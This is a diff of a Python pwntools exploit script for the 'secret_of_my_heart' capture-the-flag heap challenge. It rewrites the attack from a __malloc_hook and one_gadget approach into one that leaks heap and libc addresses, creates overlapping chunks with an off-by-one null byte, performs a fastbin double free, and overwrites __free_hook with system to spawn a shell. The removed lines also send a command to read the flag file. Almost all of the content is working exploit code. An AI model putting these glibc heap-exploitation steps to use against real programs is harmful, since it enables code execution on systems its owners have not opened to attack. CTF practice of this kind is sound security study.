@@ -37,7 +37,7 @@ if len(sys.argv) > 1 and sys.argv[1] == 'r':
 else:
     p = exe.process()
 
-def add(size, name, data):
+def add(size, name = b'a', data = b'a'):
     p.sendafter(b'choice :', str(1))
     p.sendafter(b'heart : ', str(size))
     p.sendafter(b'heart :', name)
@@ -55,49 +55,46 @@ def free(idx):
 
 
 # PAYLOAD
-
-for i in range(5): # 0 -> 4
-    add(0xf8, b'a'*0x20, b'1')
-show(1)
+add(0x20, b'a'*0x20, b'a'*0x20) # 0
+show(0)
 p.recvuntil(b'a'*0x20)
 heap_leak = u64(p.recv(6) + b'\0'*2)
-heap_base = heap_leak - 0x110
+heap_base = heap_leak - 0x10
 log.info("Heap base: " + hex(heap_base))
 
+add(0xf8)                               # 1
+add(0xf8)                               # 2
+add(0x68)                               # 3
+add(0x18)                               # 4
+
 free(1)
-add(0xf8, b'1', p64(0) + p64(heap_base + 0x500)) # 1
-
-add(0xf8,b'1',b'1') # 5
-add(0xf8,b'1',b'1') # 6
-add(0x18,b'1',b'1') # 7
-
-free(5)
-payload = p64(heap_base + 0x100) + p64(heap_base + 0x108) + b'1'*0xe0 + p64(0x100)
-add(0xf8,b'1',payload) # 5
-free(6) # Merge chunks
-show(5) # 5 van con
+add(0x98)                               # 1
+add(0x30)                               # 5
+free(1)
+add(0x18, b'a', b'a'*0x10 + p64(0x100)) # 1
+free(2)
+add(0x98)                               # 2
+show(5)
 p.recvuntil(b'Secret : ')
 libc_leak = u64(p.recv(6) + b'\0'*2)
 libc.address = libc_leak - 0x3c3b78
 log.info("Libc base: " + hex(libc.address))
-malloc_hook = libc.sym.__malloc_hook
-gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
-stdout = libc.sym._IO_2_1_stdout_
+free_hook = libc.sym.__free_hook
+system = libc.sym.system
 
-add(0x68, b'1', b'1') # 6 <-> 5
-add(0x18, b'1', b'1') # 8
-add(0x68, b'1', b'1') # 9
-free(5)
-free(9)
+payload = b'a'*0x38 + p64(0x71) + p64(free_hook - 8 + 5 - 0x10)
+add(0x68, b'a', payload)                # 6
 free(6)
-add(0x68, p64(0), p64(malloc_hook - 0x23)) # 6
-add(0x68, b'1', b'1') # 9
-add(0x68, b'1', b'1') # 5
-add(0x68, p64(0), b'\0'*0x13 + p64(gadget[2] + libc.address)) # 10
+free(3)
+free(5) # Double Free
+add(0x68, b'a', p64(heap_base + 0x110)) # 5
+add(0x68)                               # 3
+add(0x68)                               # 6
+payload = b'/bin/sh'.ljust(0x28, b'\0') + p64(0x31) + p64(0) + p64(free_hook - 0x20)
+add(0x68, b'a', payload)                # 7
+add(0x28)                               # 8
+add(0x68, b'a', b'a'*3 + p64(system))   # 9
 
-# GDB()
-free(5)
-free(9)
-p.sendline(b'cat /home/secret_of_my_heart/flag')
+free(1)
 
 p.interactive()
